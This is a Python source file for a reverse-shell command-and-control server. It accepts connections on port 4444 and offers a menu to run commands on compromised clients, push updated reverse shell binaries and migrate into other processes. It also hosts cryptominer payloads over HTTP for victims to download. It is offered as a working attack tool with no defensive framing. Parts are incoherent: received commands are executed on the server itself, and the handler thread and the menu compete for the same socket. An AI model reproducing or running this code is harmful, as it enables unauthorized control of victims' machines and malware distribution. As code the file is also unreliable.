import socket
import threading
import os

# Global list to maintain connected clients
connected_clients = []

# Listener setup
def start_listener(host="0.0.0.0", port=4444):
    """
    Start the listener for incoming reverse shell connections.
    """
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen(5)
    print(f"[INFO] Listener started on {host}:{port}")

    while True:
        client_socket, client_address = server.accept()
        print(f"[INFO] Connection established with {client_address}")
        connected_clients.append((client_socket, client_address))
        threading.Thread(target=handle_client, args=(client_socket, client_address)).start()

# Handle client communication
def handle_client(client_socket, client_address):
    """
    Handle communication with a connected reverse shell client.
    """
    try:
        while True:
            command = client_socket.recv(1024).decode("utf-8")
            if command.lower() == "exit":
                print(f"[INFO] Connection with {client_address} closed.")
                connected_clients.remove((client_socket, client_address))
                client_socket.close()
                break

            output = execute_command(command)
            client_socket.send(output.encode("utf-8"))
    except Exception as e:
        print(f"[ERROR] Connection with {client_address} lost: {e}")
        connected_clients.remove((client_socket, client_address))
        client_socket.close()

# Execute commands
def execute_command(command):
    """
    Execute a command on the connected client and return the result.

    :param command: Command to execute.
    :return: Output of the command.
    """
    try:
        return os.popen(command).read()
    except Exception as e:
        return f"[ERROR] Failed to execute command: {e}"

# Command-and-Control interface
def c2_interface():
    """
    Interactive interface for managing connected clients and issuing commands.
    """
    while True:
        print("\n[ Command and Control ]")
        print("Connected Clients:")

        for idx, (_, client_address) in enumerate(connected_clients, 1):
            print(f"{idx}.) {client_address}")

        if not connected_clients:
            print("[INFO] No connected clients.")
            break

        try:
            choice = int(input("Select a client by number (or 0 to exit): "))
            if choice == 0:
                break

            client_socket, client_address = connected_clients[choice - 1]
            print(f"[INFO] Selected client: {client_address}")

            while True:
                print("\n[ Client Options ]")
                print("1.) Send Command")
                print("2.) Update Reverse Shell Binary")
                print("3.) Migrate Process")
                print("4.) Exit to Main Menu")

                sub_choice = input("Enter your choice: ")

                if sub_choice == "1":
                    command = input(f"C2@{client_address}> ")
                    if command.lower() == "exit":
                        print("[INFO] Returning to client menu.")
                        break

                    client_socket.send(command.encode("utf-8"))
                    response = client_socket.recv(4096).decode("utf-8")
                    print(response)

                elif sub_choice == "2":
                    binary_path = input("Enter the path to the updated binary: ")
                    if not os.path.exists(binary_path):
                        print("[ERROR] File not found.")
                        continue

                    try:
                        with open(binary_path, "rb") as binary_file:
                            binary_data = binary_file.read()

                        client_socket.send(b"update_binary")
                        client_socket.send(len(binary_data).to_bytes(4, "big"))
                        client_socket.send(binary_data)
                        print("[INFO] Reverse shell binary updated successfully.")
                    except Exception as e:
                        print(f"[ERROR] Failed to update binary: {e}")

                elif sub_choice == "3":
                    pid = input("Enter the target process ID to migrate to: ")
                    client_socket.send(f"migrate {pid}".encode("utf-8"))
                    response = client_socket.recv(1024).decode("utf-8")
                    print(f"[INFO] Migration result: {response}")

                elif sub_choice == "4":
                    print("[INFO] Returning to main menu.")
                    break

                else:
                    print("[ERROR] Invalid choice. Try again.")

        except (IndexError, ValueError):
            print("[ERROR] Invalid selection. Try again.")

# Start hosting cryptominer binaries
def start_apache_server(directory="payloads/cryptominers", port=80):
    """
    Start an Apache server to host cryptominer binaries.
    """
    print(f"[INFO] Hosting cryptominer binaries from {directory} on port {port}.")
    os.system(f"python3 -m http.server {port} --directory {directory}")
